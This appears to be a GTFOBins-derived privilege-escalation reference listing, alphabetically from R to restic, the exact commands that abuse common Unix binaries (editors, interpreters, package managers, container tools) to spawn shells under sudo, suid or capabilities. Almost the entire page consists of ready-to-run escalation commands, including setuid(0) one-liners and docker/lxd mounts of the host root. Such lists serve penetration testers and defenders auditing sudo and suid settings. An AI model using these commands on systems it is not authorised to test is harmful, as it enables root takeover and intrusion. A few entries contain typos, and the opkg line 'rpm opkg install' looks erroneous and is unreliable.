---
title: "GTFOBins - shell (227 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "shell"]
summary: "227 Unix binaries whose shell function spawns an interactive shell."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `shell` function spawns an interactive shell, with the exact command. 227 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## shell payloads

### R

*Contexts: sudo, suid, unprivileged*

```bash
R --no-save -e 'system("/bin/sh")'
```

### aa-exec

*Contexts: sudo, suid, unprivileged*

```bash
aa-exec /bin/sh
```

### agetty

*Contexts: suid*

```bash
agetty -l /bin/sh -o -p -a root tty
```

### ansible-playbook

*Contexts: sudo, unprivileged*

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file
```

### ansible-test

*Contexts: sudo, unprivileged*

```bash
ansible-test shell
```

### aoss

*Contexts: sudo, unprivileged*

```bash
aoss /bin/sh
```

### apt-get

For this to work the target package (i.e., `sl`) must not be already installed.

*Contexts: sudo, suid*

```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl
```

When the shell exits the `update` command is actually executed.

*Contexts: sudo, suid*

```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### arch-nspawn

*Contexts: sudo*

```bash
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```

### ash

shell — suid variant

*Contexts: suid*

```bash
ash -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ash
```

### asterisk

A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.

*Contexts: sudo, suid, unprivileged*

```bash
asterisk -r
!/bin/sh
```

### at

`tail` is used to pause the terminal.

*Contexts: sudo, unprivileged*

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

### autoconf

*Contexts: sudo, unprivileged*

```bash
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf
```

### autoheader

*Contexts: sudo, unprivileged*

```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
```

### autoreconf

The shell is invoked multiple times.

*Contexts: sudo, unprivileged*

```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf
```

### bash

shell — suid variant

*Contexts: suid*

```bash
bash -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
bash
```

### bconsole

*Contexts: sudo, unprivileged*

```bash
bconsole
@exec /bin/sh
```

### borg

*Contexts: sudo, unprivileged*

```bash
borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
```

### bpftrace

*Contexts: sudo*

```bash
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```

*Contexts: sudo*

```bash
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file
```

*Contexts: sudo*

```bash
bpftrace -c /bin/sh -e 'END {exit()}'
```

### bundle

*Contexts: sudo, unprivileged*

```bash
BUNDLE_GEMFILE=x bundle exec /bin/sh
```

*Contexts: sudo, unprivileged*

```bash
touch Gemfile
bundle exec /bin/sh
```

This might run the shell twice, one after the other.

*Contexts: sudo, unprivileged*

```bash
echo 'system("/bin/sh")' >Gemfile
bundle install
```

### busctl

shell — suid variant

*Contexts: suid*

```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

shell — suid variant

*Contexts: suid*

```bash
busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

### cabal

shell — suid variant

*Contexts: suid*

```bash
cabal exec --project-file=/dev/null -- /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
cabal exec --project-file=/dev/null -- /bin/sh
```

### capsh

shell — suid variant

*Contexts: suid*

```bash
capsh --gid=0 --uid=0 --
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
capsh --
```

### cdist

*Contexts: sudo, unprivileged*

```bash
cdist shell -s /bin/sh
```

### certbot

This needs a writable directory, replace `.` if needed.

*Contexts: sudo, unprivileged*

```bash
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```

### check_by_ssh

The shell will only last 10 seconds.

*Contexts: sudo, unprivileged*

```bash
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```

### check_ssl_cert

The shell will be invoked multiple times.

*Contexts: sudo, unprivileged*

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x
```

### choom

shell — suid variant

*Contexts: suid*

```bash
choom -n 0 -- /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
choom -n 0 /bin/sh
```

### chroot

shell — suid variant

*Contexts: suid*

```bash
chroot / /bin/sh -p
```

*Contexts: sudo, suid (variant below)*

```bash
chroot /
```

### chrt

shell — suid variant

*Contexts: suid*

```bash
chrt 1 /bin/sh -p
```

Any number between 1 and 99 will do.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
chrt 1 /bin/sh
```

### clisp

*Contexts: sudo, suid, unprivileged*

```bash
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```

### cmake

*Contexts: sudo, unprivileged*

```bash
echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
cmake /path/to/
```

### cobc

The `/path/to/temp-file` sill be overwritten after the execution.

*Contexts: sudo, suid, unprivileged*

```bash
echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
```

### codex

*Contexts: sudo, unprivileged*

```bash
codex sandbox linux /bin/sh
```

### composer

*Contexts: sudo, unprivileged*

```bash
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```

### cpio

*Contexts: sudo*

```bash
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```

### cpulimit

shell — suid variant

*Contexts: suid*

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
cpulimit -l 100 -f -- /bin/sh
```

### csh

shell — suid variant

*Contexts: suid*

```bash
csh -b
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
csh
```

### csvtool

*Contexts: sudo, suid, unprivileged*

```bash
csvtool call '/bin/sh;false' /etc/hosts
```

### ctr

An image must be already present, for example:

```
ctr images pull docker.io/library/alpine:latest
```

*Contexts: sudo, suid*

```bash
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```

### dash

*Contexts: sudo, suid, unprivileged*

```bash
dash
```

### dc

*Contexts: sudo, suid, unprivileged*

```bash
dc -e '!/bin/sh'
```

### debugfs

*Contexts: sudo, suid, unprivileged*

```bash
debugfs
!/bin/sh
```

### dhclient

*Contexts: sudo, unprivileged*

```bash
dhclient -sf /bin/sh
```

### distcc

shell — suid variant

*Contexts: suid*

```bash
distcc /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
distcc /bin/sh
```

### dmsetup

shell — suid variant

*Contexts: suid*

```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```

### doas

The user must be allowed to use `doas`.

*Contexts: sudo, unprivileged*

```bash
doas -u root /bin/sh
```

### docker

*Contexts: sudo, suid, unprivileged*

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.

*Contexts: sudo, suid, unprivileged*

```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```

### dotnet

*Contexts: sudo, unprivileged*

```bash
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```

### dpkg

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```

*Contexts: sudo*

```bash
dpkg -i x_1.0_all.deb
```

### dvips

The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

```
tex '\special{psfile="`/bin/sh 1>&0"}\end'
```

*Contexts: sudo, suid, unprivileged*

```bash
dvips -R0 texput.dvi
```

### easyrsa

This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.

*Contexts: sudo, suid, unprivileged*

```bash
echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file
```

### ed

*Contexts: sudo, suid, unprivileged*

```bash
ed
!/bin/sh
q
```

### elvish

*Contexts: sudo, suid, unprivileged*

```bash
elvish
```

### emacs

*Contexts: sudo, unprivileged*

```bash
emacs -Q -nw --eval '(term "/bin/sh")'
```

### enscript

*Contexts: sudo, suid, unprivileged*

```bash
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```

### env

shell — suid variant

*Contexts: suid*

```bash
env /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
env /bin/sh
```

### ex

*Contexts: sudo, suid, unprivileged*

```bash
ex -c ':!/bin/sh'
```

### expect

shell — suid variant

*Contexts: suid*

```bash
expect -c 'spawn /bin/sh -p;interact'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
expect -c 'spawn /bin/sh;interact'
```

### fastfetch

*Contexts: sudo, suid, unprivileged*

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

### find

shell — suid variant

*Contexts: suid*

```bash
find . -exec /bin/sh -p \; -quit
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
find . -exec /bin/sh \; -quit
```

### firejail

*Contexts: sudo, unprivileged*

```bash
firejail /bin/sh
```

### fish

*Contexts: sudo, suid, unprivileged*

```bash
fish
```

### flock

shell — suid variant

*Contexts: suid*

```bash
flock -u / /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
flock -u / /bin/sh
```

### forge

*Contexts: sudo, suid, unprivileged*

```bash
echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
```

### ftp

*Contexts: sudo, suid, unprivileged*

```bash
ftp
!/bin/sh
```

### fzf

Press `Enter` to receive the shell.

*Contexts: sudo, suid, unprivileged*

```bash
fzf --bind 'enter:execute(/bin/sh)'
```

### gawk

*Contexts: sudo, suid, unprivileged*

```bash
gawk 'BEGIN {system("/bin/sh")}'
```

### gcc

In some older versions, the `x` argument must instead reference any existing file.

*Contexts: sudo, unprivileged*

```bash
gcc -wrapper /bin/sh,-s x
```

### gdb

shell — capabilities variant

*Contexts: capabilities*

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

*Contexts: capabilities (variant below), sudo, suid, unprivileged*

```bash
gdb -nx -ex '!/bin/sh' -ex quit
```

### gem

This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.

*Contexts: sudo, unprivileged*

```bash
gem open -e '/bin/sh -s' debug
```

### genie

*Contexts: sudo, suid, unprivileged*

```bash
genie -c '/bin/sh'
```

### ghc

*Contexts: sudo, unprivileged*

```bash
ghc -e 'System.Process.callCommand "/bin/sh"'
```

### ghci

*Contexts: sudo, unprivileged*

```bash
ghci
System.Process.callCommand "/bin/sh"
```

### ginsh

*Contexts: sudo, suid, unprivileged*

```bash
ginsh
!/bin/sh
```

### git

*Contexts: sudo, unprivileged*

```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```

Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.

*Contexts: sudo, unprivileged*

```bash
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```

shell — suid variant

*Contexts: suid*

```bash
ln -s /bin/sh git-x
git --exec-path=. x -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ln -s /bin/sh git-x
git --exec-path=. x
```

### gnuplot

*Contexts: sudo, suid, unprivileged*

```bash
gnuplot -e 'system("/bin/sh 1>&0")'
```

### go

*Contexts: sudo, unprivileged*

```bash
echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go
```

### grc

*Contexts: sudo, unprivileged*

```bash
grc --pty /bin/sh
```

### gtester

shell — suid variant

*Contexts: suid*

```bash
echo '#!/bin/sh -p' >/path/to/temp-file
echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```

### guile

*Contexts: sudo, suid, unprivileged*

```bash
guile -c '(system "/bin/sh")'
```

### hg

*Contexts: sudo, suid, unprivileged*

```bash
hg --config alias.x='!/bin/sh' x
```

### hping3

shell — suid variant

*Contexts: suid*

```bash
hping3
/bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
hping3
/bin/sh
```

### iftop

This requires the privilege to capture on some device (specify with `-i` if needed).

*Contexts: sudo, suid, unprivileged*

```bash
iftop
!/bin/sh
```

### ionice

shell — suid variant

*Contexts: suid*

```bash
ionice /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ionice /bin/sh
```

### ip

shell — suid variant

*Contexts: suid*

```bash
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```

*Contexts: sudo, suid (variant below)*

```bash
ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo
```

*Contexts: sudo*

```bash
ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
```

### ispell

shell — suid variant

*Contexts: suid*

```bash
ispell /etc/hosts
!/bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ispell /etc/hosts
!/bin/sh
```

### java

The `Shell.class` class file can be compiled offline, then uploaded to the target:

```
cat >Shell.java <<EOF
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();
    }
}
EOF

javac Shell.java
```

*Contexts: sudo, unprivileged*

```bash
java Shell
```

### jjs

*Contexts: sudo, unprivileged*

```bash
jjs
Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
```

### joe

The terminal is spawn int the terminal interface.

*Contexts: sudo, suid, unprivileged*

```bash
joe
^K!/bin/sh
```

### jrunscript

shell — suid variant

*Contexts: suid*

```bash
jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```

### jshell

*Contexts: sudo, unprivileged*

```bash
jshell
Runtime.getRuntime().exec("/path/to/command");
```

### jtag

*Contexts: sudo, unprivileged*

```bash
jtag --interactive
shell /bin/sh
```

### julia

shell — suid variant

*Contexts: suid*

```bash
julia -e 'run(`/bin/sh -p`)'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
julia -e 'run(`/bin/sh`)'
```

### ksu

*Contexts: sudo*

```bash
ksu -q -e /bin/sh
```

### kubectl

The shell is spawn multiple times.

*Contexts: sudo, unprivileged*

```bash
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
```

### latex

*Contexts: sudo, suid, unprivileged*

```bash
latex --shell-escape '\immediate\write18{/bin/sh}'
```

### latexmk

*Contexts: sudo, unprivileged*

```bash
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```

### less

*Contexts: sudo, suid, unprivileged*

```bash
less /etc/hosts
!/bin/sh
```

The optional `reset` command is needed to receive the echo back of the typed keystrokes.

*Contexts: sudo, unprivileged*

```bash
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```

*Contexts: sudo, unprivileged*

```bash
VISUAL='/bin/sh -s --' less /etc/hosts
v
```

### lftp

*Contexts: sudo, suid, unprivileged*

```bash
lftp -c '!/bin/sh'
```

### loginctl

*Contexts: sudo, unprivileged*

```bash
loginctl user-status
!/bin/sh
```

### logrotate

This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.

*Contexts: sudo*

```bash
echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
```

### logsave

shell — suid variant

*Contexts: suid*

```bash
logsave /dev/null /bin/sh -i -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
logsave /dev/null /bin/sh -i
```

### ltrace

*Contexts: sudo, unprivileged*

```bash
ltrace -b -L /bin/sh
```

### lua

*Contexts: sudo, suid, unprivileged*

```bash
lua -e 'os.execute("/bin/sh")'
```

### lxd

The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.

*Contexts: sudo, suid*

```bash
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

*Contexts: sudo, suid*

```bash
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

### m4

*Contexts: sudo, suid, unprivileged*

```bash
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
```

### mail

*Contexts: sudo, suid, unprivileged*

```bash
mail --exec='!/bin/sh'
```

*Contexts: sudo, suid, unprivileged*

```bash
mail -f /etc/hosts
!/bin/sh
```

### make

*Contexts: sudo, suid, unprivileged*

```bash
make --eval='$(shell /bin/sh 1>&0)' .
```

### man

This requires GNU `troff` (`groff`) to be installed.

*Contexts: sudo, suid, unprivileged*

```bash
man '-H/bin/sh #' man
```

### mawk

*Contexts: sudo, suid, unprivileged*

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

### minicom

Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.

After the shell, exit with `Ctrl-A x`.

*Contexts: sudo, suid, unprivileged*

```bash
minicom -D /dev/null
```

After the shell, exit with `Ctrl-A x`.

*Contexts: sudo, suid, unprivileged*

```bash
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
```

### more

*Contexts: sudo, suid, unprivileged*

```bash
more /etc/hosts
!/bin/sh
```

### mosh-server

This requires a valid SSH access.

*Contexts: sudo*

```bash
mosh --server=mosh-server localhost /bin/sh
```

### msgfilter

shell — suid variant

*Contexts: suid*

```bash
echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```

The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```

### multitime

shell — suid variant

*Contexts: suid*

```bash
multitime /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
multitime /bin/sh
```

### mysql

*Contexts: sudo, suid, unprivileged*

```bash
mysql -e '\! /bin/sh'
```

### nano

*Contexts: sudo, suid, unprivileged*

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

shell — suid variant

*Contexts: suid*

```bash
nano -s '/bin/sh -p'
/bin/sh -p
^T^T
```

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
nano -s /bin/sh
/bin/sh
^T^T
```

### ncdu

*Contexts: sudo, suid, unprivileged*

```bash
ncdu
b
```

### ncftp

shell — suid variant

*Contexts: suid*

```bash
ncftp
!/bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ncftp
!/bin/sh
```

### neofetch

*Contexts: sudo, unprivileged*

```bash
echo 'exec /bin/sh' >/path/to/temp-file
neofetch --config /path/to/temp-file
```

### nice

shell — suid variant

*Contexts: suid*

```bash
nice /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
nice /bin/sh
```

### nmap

*Contexts: sudo, suid, unprivileged*

```bash
nmap --interactive
!/bin/sh
```

### node

shell — capabilities variant

*Contexts: capabilities*

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

shell — suid variant

*Contexts: suid*

```bash
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```

*Contexts: capabilities (variant below), sudo, suid (variant below), unprivileged*

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### nohup

shell — suid variant

*Contexts: suid*

```bash
nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
```

This creates a `nohup.out` file in the current working directory.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
```

### npm

*Contexts: sudo, unprivileged*

```bash
npm exec /bin/sh
```

*Contexts: sudo, unprivileged*

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i
```

*Contexts: sudo, unprivileged*

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
```

### nroff

*Contexts: sudo, unprivileged*

```bash
echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff
```

### nsenter

shell — suid variant

*Contexts: suid*

```bash
nsenter /bin/sh -p
```

The shell command can be omitted.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
nsenter /bin/sh
```

### octave

*Contexts: sudo, suid, unprivileged*

```bash
octave-cli --eval 'system("/bin/sh")'
```

### openvpn

shell — suid variant

*Contexts: suid*

```bash
openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```

### opkg

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```

*Contexts: sudo*

```bash
rpm opkg install x_1.0_all.deb
```

### pdflatex

*Contexts: sudo, suid, unprivileged*

```bash
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

### pdftex

*Contexts: sudo, suid, unprivileged*

```bash
pdftex --shell-escape '\write18{/bin/sh}\end'
```

### perf

shell — suid variant

*Contexts: suid*

```bash
perf stat /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
perf stat /bin/sh
```

### perl

shell — capabilities variant

*Contexts: capabilities*

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

*Contexts: capabilities (variant below), sudo, unprivileged*

```bash
perl -e 'exec "/bin/sh"'
```

The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.

*Contexts: sudo, unprivileged*

```bash
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```

### perlbug

This requires to press `Enter` serveral times before the shell is spawn.

*Contexts: sudo, unprivileged*

```bash
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
```

### pexec

shell — suid variant

*Contexts: suid*

```bash
pexec /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
pexec /bin/sh
```

### pg

*Contexts: sudo, suid, unprivileged*

```bash
pg /etc/hosts
!/bin/sh
```

### php

shell — capabilities variant

*Contexts: capabilities*

```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```

*Contexts: capabilities (variant below), sudo, suid, unprivileged*

```bash
php -r 'system("/bin/sh -i");'
```

shell — capabilities variant

*Contexts: capabilities*

```bash
php -r 'posix_setuid(0); passthru("/bin/sh -i");'
```

*Contexts: capabilities (variant below), sudo, suid, unprivileged*

```bash
php -r 'passthru("/bin/sh -i");'
```

shell — capabilities variant

*Contexts: capabilities*

```bash
php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

*Contexts: capabilities (variant below), sudo, suid, unprivileged*

```bash
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

shell — capabilities variant

*Contexts: capabilities*

```bash
php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
```

shell — suid variant

*Contexts: suid*

```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

*Contexts: capabilities (variant below), sudo, suid (variant below), unprivileged*

```bash
php -r 'pcntl_exec("/bin/sh");'
```

### pic

*Contexts: sudo, suid, unprivileged*

```bash
pic -U
.PS
sh X sh X
```

### pidstat

shell — suid variant

*Contexts: suid*

```bash
pidstat -e /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
pidstat -e /bin/sh
```

### pip

*Contexts: sudo, unprivileged*

```bash
pip config --editor '/bin/sh -s' edit
```

### pkexec

*Contexts: sudo*

```bash
pkexec /bin/sh
```

### plymouth

shell — suid variant

*Contexts: suid*

```bash
plymouth ask-for-password --prompt=x --command='/bin/sh -p'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
plymouth ask-for-password --prompt=x --command=/bin/sh
```

### podman

This requires an actual image to be available (e.g., `alpine`) downloading it if not present.

*Contexts: sudo, unprivileged*

```bash
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```

### posh

*Contexts: sudo, unprivileged*

```bash
posh
```

### psftp

*Contexts: sudo, suid, unprivileged*

```bash
psftp
!/bin/sh
```

### psql

*Contexts: sudo, suid, unprivileged*

```bash
psql
\! /bin/sh
```

### puppet

*Contexts: sudo, unprivileged*

```bash
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```

### pwsh

*Contexts: sudo, unprivileged*

```bash
pwsh
```

### python

shell — capabilities variant

*Contexts: capabilities*

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

shell — suid variant

*Contexts: suid*

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

*Contexts: capabilities (variant below), sudo, suid (variant below), unprivileged*

```bash
python -c 'import os; os.execl("/bin/sh", "sh")'
```

### ranger

*Contexts: sudo, unprivileged*

```bash
ranger
S
```

### rc

*Contexts: sudo, suid, unprivileged*

```bash
rc
```

### restic

shell — suid variant

